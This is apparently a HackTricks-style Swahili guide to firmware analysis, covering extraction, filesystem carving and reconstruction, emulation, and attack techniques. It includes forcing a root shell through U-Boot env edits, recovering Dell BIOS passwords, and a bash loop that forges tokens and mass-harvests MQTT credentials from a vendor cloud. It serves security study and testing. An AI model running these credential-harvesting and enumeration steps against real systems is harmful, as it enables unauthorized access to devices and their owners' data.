# Uchambuzi wa Firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Utangulizi**

### Rasilimali zinazohusiana

Kwa kupata firmware kupitia miunganisho ya hardware iliyo wazi, angalia [Kutumia UART console kusaidia kutoa firmware](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) na [Kutoa firmware kutoka SPI flash](../hardware-hacking/spi.md#dumping-firmware-from-eeproms). Kwa kunasa UART wakati wa kuwasha kifaa mara kwa mara kabla ya kufikia console, angalia [Udhibiti wa nishati kupitia SCPI na upataji wa data kwa oscilloscope](../hardware-hacking/uart.md#automating-boot-time-uart-capture-with-scpi).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ni software muhimu inayowezesha vifaa kufanya kazi ipasavyo kwa kusimamia na kuwezesha mawasiliano kati ya vipengele vya hardware na software ambayo watumiaji hutumia. Huhifadhiwa kwenye kumbukumbu ya kudumu, ili kifaa kiweze kufikia maagizo muhimu mara tu kinapowashwa na hatimaye kuanzisha mfumo wa uendeshaji. Kuchunguza na huenda kurekebisha firmware ni hatua muhimu katika kutambua udhaifu wa usalama.<sup>[[2]](#references)[[3]](#references)</sup>

## **Kukusanya Taarifa**

**Kukusanya taarifa** ni hatua muhimu ya awali ya kuelewa muundo wa kifaa na teknolojia kinazotumia. Mchakato huu unahusisha kukusanya data kuhusu:

- Muundo wa CPU na mfumo wa uendeshaji unaotumia
- Maelezo ya bootloader
- Mpangilio wa hardware na datasheet
- Vipimo vya codebase na mahali ilipo source code
- Maktaba za nje na aina za leseni
- Historia za masasisho na vyeti vya udhibiti
- Michoro ya usanifu na mtiririko
- Tathmini za usalama na udhaifu uliotambuliwa

Kwa madhumuni haya, zana za **open-source intelligence (OSINT)** ni muhimu sana, kama ilivyo uchanganuzi wa vipengele vyovyote vya software ya open source vinavyopatikana kwa kutumia michakato ya ukaguzi wa mikono na wa kiotomatiki. Zana kama [Coverity Scan](https://scan.coverity.com) na [LGTM ya Semmle](https://lgtm.com/#explore) hutoa static analysis ya bure inayoweza kutumiwa kupata matatizo yanayoweza kuwepo.

## **Kupata Firmware**

Firmware inaweza kupatikana kwa njia mbalimbali, kila moja ikiwa na kiwango chake cha ugumu:

- **Moja kwa moja** kutoka kwa chanzo (watengenezaji, kampuni zinazotengeneza vifaa)
- **Kuijenga** kwa kutumia maagizo yaliyotolewa
- **Kuipakua** kutoka kwenye tovuti rasmi za usaidizi
- Kutumia utafutaji wa **Google dork** kupata faili za firmware zilizowekwa mtandaoni
- Kufikia **hifadhi ya cloud** moja kwa moja kwa kutumia zana kama [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Kunasa **masasisho** kwa kutumia mbinu za man-in-the-middle
- **Kuitoa** kwenye kifaa kupitia miunganisho kama **UART**, **JTAG**, au **PICit**
- **Kuchunguza trafiki** ili kupata maombi ya masasisho ndani ya mawasiliano ya kifaa
- Kutambua na kutumia **miisho ya masasisho iliyowekwa moja kwa moja kwenye code**
- **Kudump** kutoka kwenye bootloader au mtandao
- **Kutoa na kusoma** chipu ya hifadhi, ikiwa njia nyingine zote zitashindikana, kwa kutumia zana zinazofaa za hardware

### Rekodi za UART pekee: lazimisha root shell kupitia U-Boot env kwenye flash

Ikiwa UART RX haitumiki (rekodi pekee), bado unaweza kulazimisha init shell kwa **kuhariri blob ya mazingira ya U-Boot** nje ya kifaa:<sup>[[6]](#references)</sup>

1. Dump SPI flash kwa klipu ya SOIC-8 na programmer (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Tafuta env partition ya U-Boot, hariri `bootargs` ili ijumuishwe `init=/bin/sh`, na **hesabu upya CRC32 ya U-Boot env** ya blob.
3. Flash tena env partition pekee na uwashe upya; shell inapaswa kuonekana kwenye UART.

Hii ni muhimu kwenye vifaa vilivyopachikwa ambapo shell ya bootloader imezimwa, lakini env partition inaweza kuandikiwa kupitia ufikiaji wa flash ya nje.

## Kuchanganua firmware

Sasa kwa kuwa **una firmware**, unahitaji kutoa taarifa kuihusu ili ujue jinsi ya kuishughulikia. Zifuatazo ni baadhi ya zana unazoweza kutumia kwa hilo:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Ikiwa hutapata mengi kwa kutumia zana hizo, angalia **entropy** ya image kwa `binwalk -E <bin>`; ikiwa entropy ni ndogo, huenda haijasimbwa kwa njia fiche. Ikiwa entropy ni kubwa, huenda imesimbwa kwa njia fiche (au imebanwa kwa namna fulani).

Zaidi ya hayo, unaweza kutumia zana hizi kutoa **files zilizopachikwa ndani ya firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Au tumia [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kukagua file.

### Display assets ghafi katika external flash

Dump ya external SPI si lazima iwe firmware inayoweza kutekelezwa ya MCU. Kwa target ya Cortex-M, linganisha mwanzo wa kila eneo linaloweza kuwa na code na ramani ya memory ya kifaa: vector table ya kawaida huanza na anwani inayowezekana ya SRAM stack pointer na anwani ya reset-handler iliyo kwenye memory inayoweza kutekeleza code. Kukosekana kwa vector table kwenye offset sifuri pekee hakuthibitishi kuwa chip nzima haina code; kagua offsets nyingine na mpangilio wa boot. Ikiwa `binwalk` haitambui container, kagua raw bytes na ulinganishe anwani za usomaji wa flash na vitendo vinavyopakia skrini mpya, ukitumia [decoded SPI capture](../hardware-hacking/spi.md#reconstructing-spi-flash-reads-with-a-logic-analyzer).<sup>[[14]](#references)</sup>

Kwa eneo la display-asset, jaribu pixel formats na dimensions zinazowezekana badala ya kudhani ni PNG/JPEG. Kifaa kilichotajwa kilitumia fremu za **80×160 RGB565 little-endian**: kwa bytes mbili kwa kila pixel, fremu ni **25,600 bytes** (25 KiB), si kilobits 24. Anwani ya usomaji wa flash iliyodekodiwa ilibainisha offset ya screen asset; mtafiti alibadilisha picha iliyotayarishwa kwa `ffmpeg -i bubo.jpg -pix_fmt rgb565le test.rgb`, akaweka asset ya ukubwa sawa badala ya ile iliyokuwa kwenye dump ya awali, akaiandika kwa `flashrom -p linux_spi:dev=/dev/spidev0.0 -w flashme.bin`, na kuthibitisha picha mpya kwenye display. Hii inaonyesha kuwa *external display assets* zinaweza kuandikwa, si kwamba firmware ya ndani ya MCU imetolewa au kuandikwa upya. Hifadhi dump ya awali na uhakikishe dimensions, mpangilio wa bytes, offset, na urefu wa data mbadala kabla ya kuandika chochote.<sup>[[14]](#references)</sup>

### Uchambuzi linganishi wa flash na secret stores za XOR zinazoweza kurejeshwa

Wakati setting ya firmware haina format ya hifadhi iliyoandikwa kwenye nyaraka, kwanza fanya usomaji kadhaa unaolingana wa flash, badilisha setting **moja tu**, kisha dump chip nzima tena na ulinganishe offsets. Kurudia jaribio kwa kutumia values zilizodhibitiwa hutofautisha setting hiyo na counters pamoja na metadata ya uandishi; mabadiliko yanapotokea kwenye offsets mpya badala ya eneo lilelile, inaashiria hifadhi ya append-only au log-structured. Hifadhi entries zilizofutwa/kuwekewa alama ya tombstone, kwa sababu bytes zake za payload zinaweza bado kurejeshwa.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Baada ya kupata eneo hilo, toa firmware modules kwa kutumia zana kama `binwalk`, kisha fanya reverse engineering ya writer/validator katika Ghidra. Thibitisha mipaka ya fields, padding, key indexing na key derivation kwenye code badala ya kubashiri scheme kutokana na mifumo ya ciphertext pekee.<sup>[[12]](#references)</sup>

#### Rejesha keys kutoka kwenye zero padding iliyosimbwa kwa njia fiche

Kama ilivyoelezwa katika [XOR-based encryption](../../crypto/symmetric/#xor-based-encryption), known plaintext hufichua keystream bytes zilizo kwenye offsets sawa. Field yenye ukubwa usiobadilika huwa hatarini zaidi hasa pale zero padding yake inapofunika kila index ya repeating XOR key: padding iliyosimbwa hufichua key bytes hizo moja kwa moja kwa sababu `0x00 XOR key_byte = key_byte`. Ikiwa kila key index imefunikwa, tengeneza upya key kutokana na mwisho wa ciphertext, kisha decrypt bytes zenye data.<sup>[[12]](#references)</sup>

Muundo wa DVAR BIOS-password wa Dell, ambao una udhaifu, ni mfano halisi: byte `0` ya field yenye ukubwa wa bytes 32 iko katika plaintext, huku bytes `1..31` zikitumia key ya bytes 20 inayojirudia.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Kwa urefu wa nenosiri `L`, nafasi `L..31` zilikuwa sifuri kabla ya XOR. Wakati `L <= 12`, nafasi hizo zinajumuisha kila faharasa ya ufunguo, kwa hiyo ufunguo kamili na nenosiri hupatikana bila brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Pata funguo kutoka kwenye rekodi za kihistoria

Usichanganue kila rekodi kivyake. Ufunguo wa DVAR hukokotolewa takribani kama `modified_md5(device_seed || variable_GUID || password[0])`: device seed na GUID hazibadiliki, na ingizo pekee linalotegemea password ni byte yake ya kwanza iliyo wazi. Hii hutoa hadi funguo 256 kwa kila kifaa na husababisha rekodi zinazoanza kwa byte ileile kushiriki ufunguo mmoja. Panga rekodi zinazotumika na zilizofutwa kwa byte hiyo; rekodi fupi ya kihistoria inaweza kuvuja ufunguo mzima kupitia padding na kusimbua rekodi ya sasa iliyo ndefu zaidi ambayo padding yake haitoshi. Kwa hiyo, kubadilisha password kunaweza kuongeza uwezekano wa kufichuka pale ciphertext ya zamani inapowekwa alama ya kufutwa badala ya kufutwa kabisa.<sup>[[12]](#references)</sup>

Zana ya [`dellpwn`](https://github.com/R3n5k1/dellpwn) hutafuta DVAR, huthibitisha rekodi zinazoweza kutumika, hurejesha password, na inaweza kuonyesha byte ghafi zilizohifadhiwa/za ufunguo. Ijenge kutoka kwenye checkout kisha uchanganue image ya flash iliyothibitishwa kama ifuatavyo:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Kwa custom parsers, kataa matokeo chanya ya uongo kwa kutumia muundo wa rekodi, masharti ya herufi zinazoweza kuchapishwa, ukaguzi wa zero-padding, entropy ya key, na uthabiti pale key inapojizungusha. Ikiwa dumps zinazorudiwa zinaonyesha bit flips chache kwa kila write, orodhesha masks zilizozingatiwa na upange marekebisho kwa kutumia masharti haya, lakini ripoti herufi zisizo na uhakika badala ya kuwasilisha matokeo ya heuristic kana kwamba ni urejeshaji sahihi.<sup>[[12]](#references)</sup>

Password verifiers zinapaswa kuhifadhi salted, iterated one-way hash badala ya ciphertext inayoweza kurejeshwa, na log-structured stores zinapaswa kufuta kwa usalama nyenzo za siri zilizopitwa na wakati.<sup>[[12]](#references)</sup>

### Kupata Mfumo wa Faili

Kwa kutumia tools zilizotajwa awali kama `binwalk -ev <bin>`, unapaswa kuwa umeweza **kutoa mfumo wa faili**.\
Kwa kawaida, Binwalk huitoa ndani ya **folder iliyopewa jina la aina ya mfumo wa faili**, ambayo kwa kawaida ni mojawapo ya hizi: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Kutoa Mfumo wa Faili kwa Mikono

Wakati mwingine, binwalk **haitakuwa na magic byte ya mfumo wa faili kwenye signatures zake**. Katika hali hizi, tumia binwalk **kutafuta offset ya mfumo wa faili na kukata mfumo wa faili uliobanwa** kutoka kwenye binary, kisha **utoe mfumo wa faili kwa mikono** kulingana na aina yake kwa kutumia hatua zilizo hapa chini.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Tekeleza **dd command** ifuatayo ili kuchopoa filesystem ya Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Vinginevyo, amri ifuatayo pia inaweza kutekelezwa.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Kwa squashfs (iliyotumika kwenye mfano hapo juu)

`$ unsquashfs dir.squashfs`

Faili zitakuwa kwenye saraka ya "`squashfs-root`" baada ya hapo.

- Faili za kumbukumbu za CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Kwa mifumo ya faili ya jffs2

`$ jefferson rootfsfile.jffs2`

- Kwa mifumo ya faili ya ubifs yenye NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Kuunda upya mifumo ya faili ya root iliyogawanywa

Ikiwa dump ghafi ya eMMC/SSD ina kichwa halali cha mfumo wa faili lakini offset za metadata zake zinaenea nje ya ukubwa wa kawaida wa partition, usihitimishe mara moja kuwa imeharibika. Msimbo wa boot wa vifaa vilivyopachikwa unaweza kuunda kifaa halisi cha root kutoka kwenye safu nyingi za kimwili kwa kutumia Device Mapper, kwa hiyo kutoa data kutoka partition moja ya GPT kunatoa sehemu ya kwanza tu.<sup>[[9]](#references)</sup>

#### Kuchunguza picha nzima ya media

Kwanza hakikisha kuwa upataji umekamilika, ukubwa wa faili ni thabiti, na hakuna mchakato unaoendelea kuandika kwenye picha hiyo. Ikiwa jina la faili lina anwani ya mwanzo/mwisho, linganisha masafa hayo na idadi halisi ya baiti. Rejesha GPT katika hali ya kusoma pekee na ambatisha masafa yanayohitajika tu; **usiendeshe** `vgchange -ay` kwenye physical volume isiyoaminika kwenye workstation kwa sababu migongano ya volume group na uandishi usiokusudiwa vinaweza kutokea.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Pendelea kutumia VM inayoweza kutupwa wakati mantiki ya awali ya init au stack ya LVM inahitaji kuona image nzima. Logi za kihistoria za boot kutoka kwenye partition ya kawaida ya boot ni muhimu hasa: bootloader inaweza kuwa imerekodi offsets za proprietary-container, urefu wa components, uteuzi wa slot, kanuni za alignment na uthibitishaji wa signature. Tumia thamani hizo kukata command line/kernel/initramfs iliyopachikwa, kisha uthibitishe kila output kivyake kwa kutumia `file`, magic bytes na `binwalk`; kusoma hadi mwisho wa container kunaweza kuongeza initrd, object ya ACPI au signature kwa bahati mbaya kwenye kernel.<sup>[[9]](#references)</sup>

#### Rejesha ramani ya block ya wakati wa boot

Toa initramfs ya kernel na ufanye reverse engineering ya `/init` yake pamoja na maktaba zozote za storage. Katika [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/), fuatilia marejeleo ya string za `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` na njia za partition; kisha fuatilia msimbo unaochagua slot hai ya A/B na kuunda jedwali. Sehemu za kuanzia zinazofaa katika radare2 ni `r2 -A init`, `afl`, `pdf @ main` na `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Lengo la linear hupanga masafa mfululizo ya kifaa pepe kwenye masafa ya kifaa kimoja au zaidi za backing. Jedwali lililorejeshwa lenye segmenti mbili huwa na muundo huu (nafasi na urefu wote ni sekta za baiti 512):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Rudia hesabu za machine-code kwa usahihi, ikijumuisha upana wa integer, shifts na ubadilishaji wa vipimo. Kwa mfano, expression ifuatayo hukata ukubwa wa byte hadi mpaka wa 4-KiB, kisha tu kuubadilisha kuwa sectors za 512-byte; kuibadilisha na `p4_bytes // 512` husogeza tail iliyochaguliwa kwa `p4_bytes % 4096` kila partition isipokuwa ikiwa imepangiliwa kwa ukurasa.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Tengeneza upya picha tambarare ya uchanganuzi kwa kunakili masafa kwa mpangilio wa jedwali, ukitumia vipande vyenye ukubwa uliowekewa kikomo badala ya kupakia dump nzima ya media kwenye kumbukumbu. Hii pia huepusha kuunda vifaa vya mapper upande wa host. Weka offsets zilizotokana na GPT, idadi za sekta zilizogeuzwa, na urefu wa matokeo kama assertions tofauti.<sup>[[9]](#references)</sup>

#### Tofautisha uharibifu na hitilafu isiyobadilika ya ujenzi upya

Kwa SquashFS, angalia magic ya `hsqs` na usome uga wa `bytes_used` wa 64-bit little-endian kwenye offset 40 ya superblock kabla ya kuendesha `unsquashfs`. Ikiwa uchimbaji utashindwa kwenye miundo kadhaa isiyohusiana, tafuta eneo pana karibu na nafasi zinazotarajiwa na udai wagombea wenye muundo thabiti: block ya metadata inayoweza kufunguliwa kwa decompression, maingizo kadhaa mfululizo ya saraka yaliyo halali, sehemu za inode zinazokubalika, inode ya root inayolingana na idadi ya inode, au muundo halali wa metadata ya integrity. Ulinganifu mmoja wa magic hautoshi.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Wakati delta ileile iliyosainiwa inapofanya miundo huru iwe halali—kwa mfano, metadata ya saraka na rekodi ya verity—chanzo kinachowezekana ni hitilafu ya kimfumo ya mwanzo wa segment badala ya kukosekana kwa byte. Rudi kwenye hesabu iliyo kinyume na uchunguze mabaki yaliyotupiliwa mbali, signedness, overflow, au rounding ya sector/page kabla ya kujaribu kurejesha data iliyotelekezwa au kubandika metadata ya mfumo wa faili.<sup>[[9]](#references)</sup>

Hatimaye, tenga mipaka ya ulinzi: volume za LUKS zilizofungwa kwa TPM hulinda usiri wa data, ilhali mapping ya dm-verity iliyosainiwa hulinda uadilifu wa mfumo wa faili wa root. TPM ya software haiwezi kurejesha ufunguo uliofungwa kwa TPM halisi ya awali, na kuwasha SquashFS iliyorekebishwa kupitia init ya utafiti pekee inayoacha uthibitishaji wa verity hakubuni sahihi yake wala kuvunja dm-verity.<sup>[[9]](#references)</sup>

## Kuchanganua Firmware

Baada ya kupata firmware, ni muhimu kuichambua ili kuelewa muundo wake na uwezekano wa udhaifu. Mchakato huu unahusisha kutumia zana mbalimbali kuchanganua na kutoa data muhimu kutoka kwenye picha ya firmware.

### Zana za Awali za Uchambuzi

Seti ya amri imetolewa kwa ukaguzi wa awali wa faili ya binary (inayorejelewa kama `<bin>`). Amri hizi husaidia kutambua aina za faili, kutoa strings, kuchanganua data ya binary, na kuelewa maelezo ya partition na mfumo wa faili:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Ili kutathmini hali ya usimbaji fiche ya image, **entropy** hukaguliwa kwa kutumia `binwalk -E <bin>`. Entropy ya chini huashiria ukosefu wa usimbaji fiche, ilhali entropy ya juu huashiria uwezekano wa usimbaji fiche au compression.

Kwa **kutoa faili zilizopachikwa**, inapendekezwa kutumia zana na nyenzo kama nyaraka za **file-data-carving-recovery-tools** na **binvis.io** kwa ukaguzi wa faili.

### Kutoa Mfumo wa Faili

Kwa kutumia `binwalk -ev <bin>`, kwa kawaida mtu anaweza kutoa mfumo wa faili, mara nyingi kwenye directory yenye jina linalotokana na aina ya mfumo wa faili (kwa mfano, squashfs, ubifs). Hata hivyo, **binwalk** ikishindwa kutambua aina ya mfumo wa faili kwa sababu magic bytes hazipo, kutoa faili mwenyewe kunahitajika. Hii huhusisha kutumia `binwalk` kutafuta offset ya mfumo wa faili, kisha kutumia amri ya `dd` kuichonga na kuitoa:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Baadaye, kulingana na aina ya filesystem (kwa mfano, squashfs, cpio, jffs2, ubifs), hutumika amri tofauti ili kutoa maudhui kwa mikono.

### Uchambuzi wa Filesystem

Baada ya kutoa filesystem, utafutaji wa dosari za usalama huanza. Huchunguzwa daemon za mtandao zisizo salama, credentials zilizowekwa moja kwa moja kwenye code, endpoints za API, utendaji wa seva za masasisho, code ambayo haijakusanywa, scripts za kuwasha mfumo na binaries zilizokusanywa kwa ajili ya uchambuzi wa offline.

**Maeneo muhimu** na **vitu** vya kukagua ni pamoja na:

- **etc/shadow** na **etc/passwd** kwa ajili ya credentials za watumiaji
- Vyeti na keys za SSL katika **etc/ssl**
- Faili za usanidi na scripts zinazoweza kuwa na udhaifu
- Binaries zilizopachikwa kwa ajili ya uchambuzi zaidi
- Web servers na binaries zinazopatikana kwa kawaida kwenye vifaa vya IoT

Zana kadhaa husaidia kufichua taarifa nyeti na udhaifu ndani ya filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) na [**Firmwalker**](https://github.com/craigz28/firmwalker) kwa ajili ya kutafuta taarifa nyeti
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) kwa ajili ya uchambuzi wa kina wa firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), na [**EMBA**](https://github.com/e-m-b-a/emba) kwa ajili ya uchambuzi tuli na wa wakati wa utekelezaji

### Ukaguzi wa Usalama wa Binaries Zilizokusanywa

Code chanzo na binaries zilizokusanywa zinazopatikana kwenye filesystem lazima zikaguliwe kwa makini ili kubaini udhaifu. Zana kama **checksec.sh** kwa binaries za Unix na **PESecurity** kwa binaries za Windows husaidia kutambua binaries zisizolindwa ambazo zinaweza kutumiwa vibaya.

## Kuvuna usanidi wa cloud na credentials za MQTT kupitia tokeni za URL zilizotokana na data

Hub nyingi za IoT hupata usanidi wa kila kifaa kutoka kwenye endpoint ya cloud inayofanana na hii:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Wakati wa kuchambua firmware, unaweza kugundua kuwa `<token>` hutokana na device ID ndani ya kifaa kwa kutumia secret iliyowekwa moja kwa moja kwenye code, kwa mfano:

- token = MD5( deviceId || STATIC_KEY ) na kuwakilishwa kama herufi kubwa za hex

Muundo huu humwezesha mtu yeyote anayejua deviceId na STATIC_KEY kuunda upya URL na kupata usanidi wa cloud, ambao mara nyingi hufichua credentials za MQTT zilizo katika maandishi wazi na viambishi awali vya topic.

Utaratibu wa vitendo:

1) Toa deviceId kutoka kwenye kumbukumbu za kuwasha kupitia UART

- Unganisha adapta ya UART ya 3.3V (TX/RX/GND) na unasa kumbukumbu:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Tafuta mistari inayochapisha muundo wa URL ya cloud config na anwani ya broker, kwa mfano:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Pata STATIC_KEY na algorithm ya token kutoka firmware

- Pakia binaries kwenye Ghidra/radare2 na utafute config path ("/pf/") au matumizi ya MD5.
- Thibitisha algorithm (k.m., MD5(deviceId||STATIC_KEY)).
- Tengeneza token katika Bash na uweke digest katika herufi kubwa:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Kusanya usanidi wa cloud na credentials za MQTT

- Unda URL na upakue JSON kwa kutumia curl; changanua kwa jq ili kutoa siri:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Tumia vibaya MQTT ya plaintext na ACL dhaifu za topic (ikiwa zipo)

- Tumia credentials zilizopatikana ku-subscribe kwenye topics za maintenance na kutafuta matukio nyeti:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Orodhesha vitambulisho vya kifaa vinavyotabirika (kwa kiwango kikubwa, ukiwa na idhini)

- Mifumo mingi hujumuisha baiti za OUI ya mtengenezaji, bidhaa/aina zikifuatiwa na kiambishi tamati cha mfululizo.
- Unaweza kurudia vitambulisho vinavyoweza kutumika, kutoa tokeni na kuchukua usanidi kiotomatiki kupitia programu:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Maelezo
- Pata idhini ya wazi kila wakati kabla ya kujaribu kufanya enumeration kwa kiwango kikubwa.
- Ikiwezekana, pendelea emulation au static analysis ili kurejesha siri bila kurekebisha hardware lengwa.

Mchakato wa kufanya emulation ya firmware huwezesha **dynamic analysis** ya utendakazi wa kifaa au programu mahususi. Mbinu hii inaweza kukumbana na changamoto zinazohusiana na hardware au usanifu, lakini kuhamisha root filesystem au binary mahususi hadi kwenye kifaa chenye usanifu na endianness zinazolingana, kama vile Raspberry Pi, au kwenye virtual machine iliyoundwa awali, kunaweza kurahisisha majaribio zaidi.

### Kufanya Emulation ya Binary Mahususi

Unapochunguza programu moja, ni muhimu kubaini endianness na usanifu wa CPU wa programu hiyo.

#### Mfano wa Usanifu wa MIPS

Ili kufanya emulation ya binary ya usanifu wa MIPS, unaweza kutumia amri:

```bash
file ./squashfs-root/bin/busybox
```

Na ili kusakinisha zana muhimu za uigaji:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Kwa MIPS (big-endian), hutumika `qemu-mips`, na kwa binary za little-endian, chaguo ni `qemu-mipsel`.

#### Uigaji wa ARM Architecture

Kwa binary za ARM, mchakato ni sawa, huku emulator ya `qemu-arm` ikitumika kwa uigaji.

### Uigaji wa Mfumo Mzima

Zana kama [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), na nyinginezo, hurahisisha uigaji kamili wa firmware, hufanya mchakato kiotomatiki na kusaidia katika uchanganuzi wa nguvu.

### Kujenga upya root filesystem zilizogawanywa na kuthibitishwa kwa ajili ya uigaji

Ikiwa superblock ya SquashFS inasomeka lakini offsets za inode, directory, au fragment table haziwezekani, usiirekebishe `unsquashfs` mara moja. Fanya reverse engineering ya binary ya boot ya awali na uunde upya grafu ya block device inayoitengeneza: mifumo iliyopachikwa inaweza kuonyesha partition ya root ya kawaida lakini ikaunda filesystem halisi kwa kutumia mapping ya `dm-linear` inayoongeza sectors zilizokopwa kutoka partition nyingine. Ukaguzi wa superblock pekee unaweza kufaulu hata kama kila block ya metadata inayofuata imehamishwa kutoka mahali pake.<sup>[[11]](#references)</sup>

Hifadhi hesabu za firmware kama zilivyo. Hasa, tambua ikiwa urefu unapimwa kwa bytes, sectors za baiti 512, au pages za KiB 4; rudia shifts na truncation kwa mpangilio wake wa awali; na zingatia maeneo ya mwisho yanayotegemea bank katika mipangilio ya A/B. Kwa mfano, `(partition_bytes >> 12) << 3` kwanza hukata hadi kwenye mpaka wa KiB 4 na ndipo huonyesha matokeo kwa sectors za baiti 512; kuibadilisha na `partition_bytes // 512` kunaweza kusogeza eneo lililoongezwa kwa kilobytes chache na kuharibu majedwali yote ya SquashFS yanayofuata.<sup>[[11]](#references)</sup>

Mtiririko mzuri wa uthibitishaji ni:<sup>[[11]](#references)</sup>

1. Pata kifaa chanzo, sector ya mwanzo, na urefu wa kila sehemu ya `dm-linear` kutoka kwenye binary ya verifier/init.
2. Unganisha au map sehemu hizo bila kubadilisha maana ya alignment yake.
